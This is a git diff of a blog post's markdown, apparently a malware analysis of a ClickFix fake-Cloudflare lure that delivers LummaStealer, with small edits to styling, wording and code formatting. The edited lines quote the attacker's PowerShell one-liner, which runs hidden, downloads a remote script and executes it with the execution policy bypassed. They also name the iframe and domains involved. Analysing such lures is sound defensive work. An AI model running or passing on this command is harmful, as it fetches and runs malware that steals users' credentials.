@@ -6,7 +6,7 @@ categories: malware analysis
 ---
 
 <style>
-  body { font-size: 13px; }
+  body { font-size: 15px; }
   body {font-family: 'Inter', sans-serif}
   h1 { font-size: 19px !important; }
   h2 { font-size: 17px !important; }
@@ -30,7 +30,7 @@ Here is the Clickfix prompt on load. First, lets see how this got here? Where fr
 ![Stage 1](/images/cloudflare_stage1.PNG)
 ![Stage 2](/images/cloudflare_stage2.PNG)
 
-So why are we sending GET requests to brainbot by visiting the website? This little iframe here.
+So why are we sending GET requests to brainbot by visiting the website and the Clickfix prompt above? This little iframe here.
 
 ![BrainBot iframe](/images/brainbot_iframe.PNG)
 
@@ -113,7 +113,7 @@ When I go to paste the command in run I get the domain 'veriqloudx' not 'fullpor
 Alright now we know what the server side is getting up to. Lets run one of these payloads in a VM and dig into what it's doing.
 
 I'm going to go with:
-- ````powershell -w h -c "$f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1';curl ${gotourl} -o $f;powershell -w h -ep Bypass -f $f```
+- ```powershell -w h -c "$f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1';curl ${gotourl} -o $f;powershell -w h -ep Bypass -f $f```
 
 LummaStealer as per previous writeups does VM/Sandboxing detection capabilities. So this may be difficult.
 
